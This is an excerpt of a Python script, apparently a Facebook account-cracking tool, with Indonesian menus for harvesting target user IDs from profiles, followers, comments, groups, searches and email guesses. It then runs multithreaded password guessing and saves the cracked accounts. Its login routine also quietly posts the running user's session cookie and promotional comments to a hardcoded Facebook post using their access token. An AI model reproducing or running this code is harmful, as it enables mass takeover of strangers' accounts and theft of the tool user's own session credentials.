...
###---[ INFO AUTHOR ]---##
author= 'Chandrika'
github= 'github.com/ChandrikaProCodeId'
...
def logo(n):
	return str(f"""
╠───{M}Creator:Chandrika
╠───{M}Facebook:Chandrika Pro
╠───{M}Github:https://github.com/ChandrikaProCodeId
╠───{M}Version:1.7
...
sleep(1)
#password#
print("\033[92m If you don't know the search  password on github")
os.system('xdg-open https://github.com/ChandrikaCodeProId')
print("\033[92m LIKE MY FACEBOOK")
input("\n\033[95m[\033[97m?\033[95m] \033[97mEnter Your Name \033[97m:\033[92m ")
Password = "OPEN BO"

loop = 'true'
while (loop == 'true'):
    passcode = input("\033[1;95m[\033[97m?\033[95m] \033[92mPassword Tools\033[97m:\033[92m")
...
def login():
	...
	try:
		...
		tem      = ('\nSemangat Bg🤔 & @[100080401896380:]\n\nTutor Nya Work BANGET😭\n')
		slebew = ('\nHello World!\n\nKOMENTAR DI TULIS SAMA BOT\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
		link = ('https://www.facebook.com/100080401896380/posts/172522282104501/?app=fbl')
		random_kata = random.choice(["Acc Ter😁","MAKASI BANG TUTORNYA","WORK BANGET ANJAI","Mantap Bang Work😘","Very Nice♥️","I Love You @[100080401896380:]","Semangat Bang♥️"])
		#ses.post(f"https://graph.facebook.com/3125119757751929?fields=subscribers&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/172522282104501/comments/?message={slebew}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/172522282104501/comments/?message={random_kata}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/172522282104501/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/172522282104501/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
		open('.cookie.txt','w').write(cookie)
		open('.token.txt','w').write(token)
	except Exception as e:exit(f"╠───[{M}>{P}] Login Gagal Atau Cookies Kedaluarsa")
...
def menu(n,t,c):
	...
	print(logo(n)+f'\n')
	print('╠──────────────────────────────────────────────────────────────────────────────╣')
	print(f"╠───{P}[{hh}01{P}] CRACK PUBLIK     [{hh}07{P}] CRACK DARI PENCARIAN")
	print(f"╠───[{hh}02{P}] CRACK MASSAL     [{hh}08{P}] CRACK DARI FILE")
	print(f"╠───[{hh}03{P}] CRACK FOLLOW     [{hh}09{P}] HASIL CRACK")
	print(f"╠───[{hh}04{P}] CRACK COMENT     [{hh}10{P}] CEK AKUN NON-AKTIF")
	print(f"╠───[{hh}05{P}] CRACK GROUP      [{hh}11{P}] CEK OPSI CHECKPOINT")
	print(f"╠───[{hh}06{P}] CRACK EMAIL      [{hh}12{P}] LOGOUT ({M}HAPUS COOKIE{P})")
	print('╠──────────────────────────────────────────────────────────────────────────────╣')
	...
	elif ask in ['',' ',]:sys.exit(f"╠───[{hh}!{P}] ISI YANG BENAR")
	else:sys.exit(f"╠───[{hh}!{P}] ISI YANG BENAR")
...
def cek_akun():
	...
	xxx = input('╠───[{hh}>{P}] Simpan Akun Tidak Kenon Ke File Apa : \n╠───[{hh}>{P}] Nama : ')
	nonon = xxx+'.txt'
	file = nom[int(exc)-1]
	print('╠──────────────────────────────────────────────────────────────────────────────╣')
	print(f'╠───[{hh}!{P}] Akun Tidak Kenon Di : {nonon}\n╠───[{hh}!{P}] Akun Yang Kenon Di  : Buang Goblok')
	print('╠──────────────────────────────────────────────────────────────────────────────╣')
	try:
...
def clon_email():
	...
	global ok , cp
	print(f'╠───[{hh}!{P}] Dump Dari Email, Max 5000 ID')
	nama = input(f'╠───[{hh}!{P}] Masukkan Nama Target : ')
	if ',' in str(nama):
		exit(f'╠───[{hh}!{P}] Masukkan 1 Nama Saja')
	print(f'╠───[{hh}!{P}] Contoh Domain: @gmail.com,@yahoo.com')
	doma = input(f'╠───[{hh}!{P}] Masukkan Domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f'╠───[{hh}!{P}] Masukan Domain Yang Benar')
	jumlah = input(f'╠───[{hh}!{P}] Mau Berapa Target Max 5000  : ')
...
def crack_file():
	...
	try:
		...
		for data in uuid:
			try:user,nama = data.split('|')
			except:exit(f"╠───[{hh}!{P}] Pemisah Salah")
			dump.append(data)
			print('\r╠───[{hh}!{P}] Sedang Dump %s ID'%(len(dump)),end=" ")
			sleep(0.0000003)
	except FileNotFoundError:exit(f"╠───[{hh}!{P}] File Tidak Ada")
...
def crack_search():
	...
	nam = input(f'╠───[{hh}!{P}] Masukkan Nama : ').split(",")
	for ser in nam:		
...
def get_komen(url):
	...
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			...
			print(f'\r╠───[{hh}!{P}] Sedang Dump {len(dump)} ID Com ',end='');sys.stdout.flush()
	for z in data.find_all("a",href=True):
		if "╠───[{hh}!{P}] Lihat Komentar Sebelumnya…" in z.text:
...
def crack_masal(t,c):
    print(f'╠───[{hh}!{P}] PASTIKAN ID TARGET BERSIFAT PUBLIK ')
    try:
        bz=0
        apa = int(input(f'╠───[{hh}!{P}] Mau Berapa Target : '))
    except:apa=1
    for bz in range(apa):
    	bz +=1
    	akun = input(f'\r╠───[{hh}!{P}] Masukkan Id Ke {bz} : ')
    	try:
    		...
    		print(f"\r╠───[{hh}!{P}] AKUN TIDAK PUBLIK       ")
    		continue	                       		
    atur_atur()
	...
	try:
		...
		for pi in bas["subscribers"]["data"]:
			try:
				...
				print('\r╠───[{hh}!{P}] Sedang Dump %s ID Foll'%(len(dump)),end=" ")
				sys.stdout.flush()
				time.sleep(0.0002)
			except:continue
		atur_atur()
	...
	try:
		...
		for x in data.find_all("table"):
			...
			if ">" in par.split(" ") or "mengajukan" in par.split(" "):
				...
				print(f'\r╠───[{hh}!{P}] Sedang Dump {len(dump)} ID Grup ',end='');sys.stdout.flush()
...
def atur_atur():
	...
	if ch in ['1','01']:
		...
		for x in dump:
			id.append(x)
	print(f"\r{P}╠────────────────────────────────────────────────────────────────╣")
	cp = input(f'╠───[{hh}!{P}] Tampilkan Opsi CP [Ya/no]\n╠───[{hh}?{P}]. Pilih : ')
	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:
		cepeh.append('ya')
	print(f"\r{P}╠────────────────────────────────────────────────────────────────╣")
	apk = input(f'╠───[{hh}!{P}] Tampilkan Info Aplikasi [Ya/no]\n╠───[{hh}?{P}]. Pilih : ')
	if apk in ['y','Ya','ya','1']:akunok.append('apk')
	else:akunok.append('coki')
	print(f"\r{P}╠────────────────────────────────────────────────────────────────╣")
	ch = input(f'╠───[{hh}1{P}]. Pw Manual \n╠───[{hh}2{P}]. Pw Gabung \n╠───[{hh}3{P}]. Pw Awutoh\n╠───[{hh}?{P}]. Pilih Sandi  : ')
...
def gabung():
	...
	if ',' in str(C):
		exit(f"╠───[{hh}!{P}] Sandi Belakang Satu Kata Saja")
	print('╠──────────────────────────────────────────────────────────────────────────────╣')
	print(f'╠───[{hh}!{P}] Akun OK Di : {sim_ok}\n╠───[{hh}!{P}] Akun CP Di : {sim_cp}')
	print('╠──────────────────────────────────────────────────────────────────────────────╣')
	awal = datetime.now()
...
def otomatis():
	global ok,cp
	print('╠──────────────────────────────────────────────────────────────────────────────╣')
	print(f'╠───[{hh}!{P}] {hh}HASIL Ok Di Simpan Di : {sim_ok}{P}\n╠───[{hh}!{P}] {K}HASIL Cp Di Simpan Di : {sim_cp}{P}')
	print('╠──────────────────────────────────────────────────────────────────────────────╣')
	awal = datetime.now()
	with tred(max_workers=30) as babas:
		for akun in id:
...
def crack(idf,pwx,url,awal):
	...
	print(f"\r╠───[{hh}CHANDRIKA{P}] {ahir} %s/%s OK:-%s CP:-%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush()
	for pw in pwx:
		try:
